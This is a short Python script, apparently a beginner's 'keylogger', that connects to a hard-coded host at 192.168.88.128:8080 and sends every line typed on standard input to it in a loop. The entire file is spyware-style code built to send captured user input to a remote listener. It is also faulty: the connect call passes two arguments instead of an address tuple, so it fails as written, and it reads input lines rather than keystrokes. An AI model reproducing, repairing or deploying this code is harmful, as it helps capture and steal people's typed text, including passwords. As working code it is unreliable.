#!/usr/bin/python


import socket
import os

def connecting():
	s = socket.socket()
	s.connect("192.168.88.128", 8080)

	while True:
		try:
			print("Starting Keylog...")
			text = input().encode()
			while True:
				s.send(text)
				text = input().encode()
		except KeyboardInterrupt:
			print("[!] Programa was terminated")
			s.close()
			break

def main():
	connecting()
main()